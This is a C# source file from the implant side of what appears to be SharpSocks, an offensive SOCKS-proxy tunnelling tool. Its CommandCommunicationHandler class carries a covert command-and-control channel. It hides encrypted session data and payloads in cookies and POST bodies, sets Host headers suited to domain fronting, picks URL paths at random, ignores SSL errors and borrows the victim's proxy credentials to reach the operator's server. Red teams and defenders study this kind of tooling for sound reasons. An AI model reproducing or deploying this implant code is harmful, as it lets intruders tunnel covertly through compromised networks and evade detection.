﻿using Common.Classes.Encryption;
using ImplantSide.Classes.ErrorHandler;
using ImplantSide.Classes.Helpers;
using ImplantSide.Classes.Target;
using ImplantSide.Interfaces;
using SharpSocksImplant.Interfaces;
using SocksProxy.Classes.Extensions;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace ImplantSide.Classes.Comms
{
    public class CommandCommunicationHandler
    {
        IEncryptionHelper _encryption;
        public IImplantLog ImplantComms { get; set; }

        AutoResetEvent Timeout = new AutoResetEvent(false);
        SocksClientConfiguration _config;
        Random _urlRandomizer = new Random(); //Yes yes this is a terrible random number generator
        InternalErrorHandler _error;
        bool? InitialConnectionSucceded;

        public CommandCommunicationHandler(IEncryptionHelper encryption, SocksClientConfiguration config, InternalErrorHandler error)
        {
            _encryption = encryption;
            this._config = config;
            _error = error;
        }

        public List<byte> Send(IExitableTarget target, List<byte> payload, out bool commandChannelDead)
        {
            return Send(target, "nochange", payload, out commandChannelDead);
        }

        public List<byte> Send(IExitableTarget target, String status, List<byte> payload, out bool commandChannelDead)
        {

			String sessionPayload = target.TargetId;
			commandChannelDead = false;

			if (String.IsNullOrWhiteSpace(status))
                status = "nochange";

            var sessionAndStatus = sessionPayload + ":" + status;
            var encryptedSessionPayload = _encryption.Encrypt(UTF8Encoding.UTF8.GetBytes(sessionAndStatus).ToList());

            var cookies = new CookieContainer();
            WebClientEx wc = null;
            if (!String.IsNullOrWhiteSpace(_config.HostHeader))
                wc = new WebClientEx(cookies, _config.HostHeader, _config.InsecureSSL) { UserAgent = _config.UserAgent };
            else
                wc = new WebClientEx(cookies, _config.InsecureSSL) { UserAgent = _config.UserAgent };

            if (_config.UseProxy)
                if (null == _config.WebProxy)
				{
					wc.Proxy = HttpWebRequest.GetSystemWebProxy();
					wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
				}
                else 
                    wc.Proxy = _config.WebProxy;
            wc.Headers.Add("Host", _config.HostHeader);

            cookies.Add(new Cookie($"{_config.SessionCookieName}", $"{encryptedSessionPayload}") { Domain = (!String.IsNullOrWhiteSpace(_config.HostHeader)) ? _config.HostHeader.Split(':')[0] : _config.URL.Host });

            string encPayload = null;
            if (null != payload && payload.Count > 0)
            {
                try
                {
                    encPayload = _encryption.Encrypt(payload);
                    if (String.IsNullOrWhiteSpace(encPayload))
                    {
                        _error.LogError("Encrypted payload was null, it shouldn't be");
                        if (!InitialConnectionSucceded.HasValue)
                            InitialConnectionSucceded = false;
						wc.Dispose();
						return null;
                    }
                }
                catch (Exception ex)
                {
                    _error.LogError(ex.Message);
					wc.Dispose();
					return null;
                }
            }
            
            bool retryRequired = false;
            Int32 retryInterval = 2000;
            UInt16 retryCount = 0;
            Guid errorId = Guid.NewGuid();
            do
            {
                try
                {
                    String response = null;
                    if (encPayload != null && encPayload.Count() > 4096)
                        response = wc.UploadString(BuildServerURI(), encPayload);
                    else
                    {
                        if (null != _config.HostHeader)
                        {
                            if (wc.Headers.AllKeys.Contains("Host"))
                            {
                                if (wc.Headers["Host"] != _config.HostHeader)
                                    wc.Headers["Host"] = _config.HostHeader;
                            }
                            else
                                wc.Headers.Add("Host", _config.HostHeader);
                        }
                        if (payload != null && payload.Count() > 0)
                            cookies.Add(new Cookie($"{_config.PayloadCookieName}", $"{encPayload}") { Domain = (!String.IsNullOrWhiteSpace(_config.HostHeader)) ? _config.HostHeader.Split(':')[0] : _config.URL.Host });
                        
                        response = wc.DownloadString(BuildServerURI());
                    }
                    
                    if (!InitialConnectionSucceded.HasValue)
                        InitialConnectionSucceded = true;

					if (null != response && response.Count() > 0)
					{
						wc.Dispose();
						return _encryption.Decrypt(response);
					}
					else
					{
						wc.Dispose();
						return new List<byte>();
					}
                        
                }
                catch (System.Net.WebException ex)
                {
                    var lst = new List<String>();
                    if (WebExceptionAnalyzer.IsTransient(ex))
                    {
                        if (15 > retryCount++)
                        {
                            _error.LogError($"Error has occured and looks like it's transient going to retry in {retryInterval} milliseconds: {ex.Message}");
                            retryRequired = true;

                            if (retryInterval++ > 2)
                                retryInterval += retryInterval;
                            
                            Timeout.WaitOne(retryInterval);
                        }
                        else
                        {
                            _error.FailError($"Kept trying but afraid error isn't going away {retryInterval} {ex.Message} {ex.Status.ToString()} {_config.CommandServerUI.ToString()} {errorId.ToString()}");
							commandChannelDead = true;
							wc.Dispose();
							return null;
						}
                    }
                    else if (sessionPayload == _config.CommandChannelSessionId)
                    {
                        if (!RetryUntilFailure(ref retryCount, ref retryRequired, ref retryInterval))
                        {
                            lst.Add("Command channel re-tried connection 5 times giving up");
                            ReportErrorWebException(ex, lst, errorId);
							commandChannelDead = true;
							wc.Dispose();
							return null;
						}
						retryRequired = true;
                    }
                    else
                    {
                        ReportErrorWebException(ex, lst, errorId);
                        if (HttpStatusCode.NotFound == ((HttpWebResponse)ex.Response).StatusCode)
                        {
                            if (_error.VerboseErrors)
								_error.LogError(String.Format($"Connection on server has been killed"));
                        }
                        else
                            _error.LogError(String.Format($"Send to {_config.URL} failed with {ex.Message}"));
						wc.Dispose();
						return null;
                    }                       
                }
            } while (retryRequired && !target.Exit);

            if (!InitialConnectionSucceded.HasValue)
			{
				commandChannelDead = true;
				InitialConnectionSucceded = false;
			}
			
			wc.Dispose();
			return null;
        }

        bool RetryUntilFailure(ref UInt16 retryCount, ref bool retryRequired, ref Int32 retryInterval)
        {
            if (5 <= retryCount++)
				return retryRequired = false;
            
			_error.LogError($"Command Channel failed to connect : retry interval {retryInterval} ms");
			Timeout.WaitOne(retryInterval);
			retryInterval += retryInterval;
			return true;
        }

        Uri BuildServerURI(String payload = null)
        {
            if (null != _config.Tamper)
                return new Uri(_config.Tamper.TamperUri(_config.CommandServerUI, payload));
            
            if (_config.URLPaths.Count() == 0 )
                return new Uri(_config.URL, "Upload");
            else
            {
                var path = _config.URLPaths[_urlRandomizer.Next(0, _config.URLPaths.Count())];
                return new Uri(_config.URL, path);
            }
        }

        void ReportErrorWebException(System.Net.WebException ex, List<String> lst, Guid errorId)
        {
            lst.Add(ex.Message);
            lst.Add(ex.Status.ToString());
            lst.Add(_config.CommandServerUI.ToString());
            lst.Add(errorId.ToString());
            _error.LogError(lst);
        }
    }
}
